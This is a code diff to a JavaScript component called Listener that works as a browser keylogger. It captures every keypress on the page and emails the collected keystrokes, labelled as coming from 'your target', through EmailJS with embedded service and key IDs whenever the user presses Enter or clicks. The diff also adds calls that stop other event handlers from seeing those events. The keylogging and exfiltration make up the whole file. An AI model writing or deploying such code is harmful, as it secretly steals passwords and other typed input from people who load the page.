@@ -9,34 +9,53 @@ export default function Listener() {
         var result = ''
         var character = String.fromCharCode(e.keyCode)
         result += character
-        if (e.button === 0) {
-            keyString += result += 'click'
-            console.log(keyString)
-        } else if (e.keyCode !== 13) {
+        if (e.keyCode !== 13) {
             keyString += result
             console.log(keyString)
         }
     }
-    function sendString (e) {
-        if (e.keyCode === 13) {
-            emailParams = {
-                from_name: "your target",
-                package: keyString
-            }
-            sendEmail()
-            keyString=""
-        }
-    }
-
     document.addEventListener('keypress', (e) => {
         buildKeyString(e);
+        e.stopImmediatePropagation();
     })
-    document.addEventListener('onmouseup', (e) => {
-        buildKeyString(e);
-    })
+
+    function sendStringEnter (e) {
+        emailParams = {
+            from_name: "your target",
+            package: keyString
+        }
+        if (e.keyCode === 13 && keyString !== "") {
+            sendEmail()
+            keyString=""
+            console.log("'enter' sent package")
+        } else if (e.keyCode === 13 && keyString === ""){
+            console.log("No package sent; keyString empty")
+        }
+    }
     document.addEventListener('keyup', (e) => {
-        sendString(e);
+        sendStringEnter(e);
+        e.stopImmediatePropagation();
     })
+
+    function sendStringClick (e) {
+        emailParams = {
+            from_name: "your target",
+            package: keyString
+        }
+        if (e.button === 0 && keyString !== "") {
+            sendEmail()
+            keyString=""
+            console.log("'click' sent package")
+        } else if (e.button === 0 && keyString === "") {
+            console.log("No package sent; keyString empty")
+        }
+    }
+    document.addEventListener('mouseup', (e) => {
+        sendStringClick(e);
+        e.stopImmediatePropagation();
+    })
+
+
 
     const sendEmail = (e) => {
         emailjs.send('service_75hzedc', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
